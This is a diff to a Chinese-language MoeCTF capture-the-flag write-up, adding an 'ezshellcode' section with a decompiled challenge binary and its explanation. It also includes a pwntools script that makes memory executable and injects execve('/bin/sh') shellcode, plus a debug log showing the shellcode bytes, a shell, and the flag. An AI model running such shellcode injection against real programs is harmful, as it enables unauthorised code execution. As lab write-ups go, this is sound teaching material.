@@ -269,9 +269,9 @@ __int64 __fastcall bypass(__int64 a1)
 ```c
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  init(argc, argv, envp);
-  vuln();
-  return 0;
+    init(argc, argv, envp);
+    vuln();
+    return 0;
 }
 ```
 
@@ -1079,3 +1079,220 @@ exit
 结束。
 
 至于我们 `exit` 之后程序会怎么走，这其实已经不重要了。事实上，我们仍然没有为程序指定一个 `system` 之后的返回地址，但鉴于我们已经拿到了 `flag`，再多的段错误也已经和我们无关了。
+
+## ezshellcode
+
+> [!NOTE]
+> **FLAG:** ``
+
+首先先用 IDA Pro 反编译 `pwn` 文件：
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+    int v4;              // [rsp+0h] [rbp-20h] BYREF
+    int prot;            // [rsp+4h] [rbp-1Ch]
+    int v6;              // [rsp+8h] [rbp-18h]
+    int v7;              // [rsp+Ch] [rbp-14h]
+    void *s;             // [rsp+10h] [rbp-10h]
+    unsigned __int64 v9; // [rsp+18h] [rbp-8h]
+
+    v9 = __readfsqword(0x28u);
+    init(argc, argv, envp);
+    s = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
+    if (s == (void *)-1LL)
+    {
+        perror("mmap");
+        return 1;
+    }
+    memset(s, 0, 0x1000uLL);
+    v6 = 0;
+    prot = 0;
+    puts("In a ret2text exploit, we can use code in the .text segment.");
+    puts("But now, there is no 'system' function available there.");
+    puts("How can you get the flag now? Perhaps you should use shellcode.");
+    puts("But what is shellcode? What can you do with it? And how can you use it?");
+    puts("I will give you some choices. Choose wisely!");
+    __isoc99_scanf("%d", &v4);
+    do
+        v7 = getchar();
+    while (v7 != 10 && v7 != -1);
+    if (v4 == 4)
+    {
+        if (v6 == 1)
+            puts("You can only make one change!");
+        prot = 7;
+        v6 = 1;
+    }
+    else
+    {
+        if (v4 > 4)
+            goto LABEL_24;
+        switch (v4)
+        {
+        case 3:
+            if (v6 == 1)
+                puts("You can only make one change!");
+            prot = 4;
+            v6 = 1;
+            break;
+        case 1:
+            if (v6 == 1)
+                puts("You can only make one change!");
+            prot = 1;
+            v6 = 1;
+            break;
+        case 2:
+            if (v6 == 1)
+                puts("You can only make one change!");
+            prot = 3;
+            v6 = 1;
+            break;
+        default:
+        LABEL_24:
+            puts("Invalid choice. The space remains in its chaotic state.");
+            exit(1);
+        }
+    }
+    if (mprotect(s, 0x1000uLL, prot) == -1)
+    {
+        perror("mprotect");
+        exit(1);
+    }
+    puts("\nYou have now changed the permissions of the shellcode area.");
+    puts("If you can't input your shellcode, think about the permissions you just set.");
+    read(0, s, 0x1000uLL);
+    ((void (*)(void))s)();
+    return 0;
+}
+```
+
+略去 Canary 保护，程序使用 `mmap` 进行了一次内存映射分配：由系统选择内存地址、分配一块可读可写的、4096 字节大小的内存；随后使用 `memset` 将这块内存全部写 `0`。接下来，程序打印提示：
+
+> In a ret2text exploit, we can use code in the .text segment.</br>
+> But now, there is no 'system' function available there.</br>
+> How can you get the flag now? Perhaps you should use shellcode.</br>
+> But what is shellcode? What can you do with it? And how can you use it?</br>
+> I will give you some choices. Choose wisely!</br>
+
+---
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+
+io = connect('127.0.0.1', 14041)
+
+io.sendlineafter(b'Choose wisely!', b'4')
+
+shellcode = asm(shellcraft.amd64.linux.sh())
+
+log.info(f"Generated shellcode: {shellcode}")
+log.info(f"Shellcode length: {len(shellcode)} bytes")
+
+io.sendline(shellcode)
+
+io.interactive()
+```
+
+```plain
+┌──(stellalyrin㉿lyrin-A16)-[~/MoeCTF/Pwn/ezshellcode]
+└─$ python ./flag.py
+[+] Opening connection to 127.0.0.1 on port 14041: Done
+[DEBUG] Received 0x12a bytes:
+    b'In a ret2text exploit, we can use code in the .text segment.\n'
+    b"But now, there is no 'system' function available there.\n"
+    b'How can you get the flag now? Perhaps you should use shellcode.\n'
+    b'But what is shellcode? What can you do with it? And how can you use it?\n'
+    b'I will give you some choices. Choose wisely!\n'
+[DEBUG] Sent 0x2 bytes:
+    b'4\n'
+[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
+[DEBUG] Assembling
+    .section .shellcode,"awx"
+    .global _start
+    .global __start
+    _start:
+    __start:
+    .intel_syntax noprefix
+    .p2align 0
+        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+        /* push b'/bin///sh\x00' */
+        push 0x68
+        mov rax, 0x732f2f2f6e69622f
+        push rax
+        mov rdi, rsp
+        /* push argument array ['sh\x00'] */
+        /* push b'sh\x00' */
+        push 0x1010101 ^ 0x6873
+        xor dword ptr [rsp], 0x1010101
+        xor esi, esi /* 0 */
+        push rsi /* null terminate */
+        push 8
+        pop rsi
+        add rsi, rsp
+        push rsi /* 'sh\x00' */
+        mov rsi, rsp
+        xor edx, edx /* 0 */
+        /* call execve() */
+        push 59 /* 0x3b */
+        pop rax
+        syscall
+[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-7jit6wcz/step2 /tmp/pwn-asm-7jit6wcz/step1
+[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-7jit6wcz/step3 /tmp/pwn-asm-7jit6wcz/step4
+[*] Generated shellcode: b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
+[*] Shellcode length: 48 bytes
+[DEBUG] Sent 0x31 bytes:
+    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
+    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
+    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
+    00000030  0a                                                  │·│
+    00000031
+[*] Switching to interactive mode
+
+[DEBUG] Received 0x8a bytes:
+    b'\n'
+    b'You have now changed the permissions of the shellcode area.\n'
+    b"If you can't input your shellcode, think about the permissions you just set.\n"
+
+You have now changed the permissions of the shellcode area.
+If you can't input your shellcode, think about the permissions you just set.
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x2c bytes:
+    b'bin\n'
+    b'flag\n'
+    b'lib\n'
+    b'lib32\n'
+    b'lib64\n'
+    b'libexec\n'
+    b'libx32\n'
+    b'pwn\n'
+bin
+flag
+lib
+lib32
+lib64
+libexec
+libx32
+pwn
+$ cat flag
+[DEBUG] Sent 0x9 bytes:
+    b'cat flag\n'
+[DEBUG] Received 0x2f bytes:
+    b'moectf{P0wERfuI_SHE1Ic0de_C@n-Do-ANyThING3180}\n'
+moectf{P0wERfuI_SHE1Ic0de_C@n-Do-ANyThING3180}
+$ exit
+[DEBUG] Sent 0x5 bytes:
+    b'exit\n'
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Closed connection to 127.0.0.1 port 14041
+```
+
+---
+
+## 认识 libc
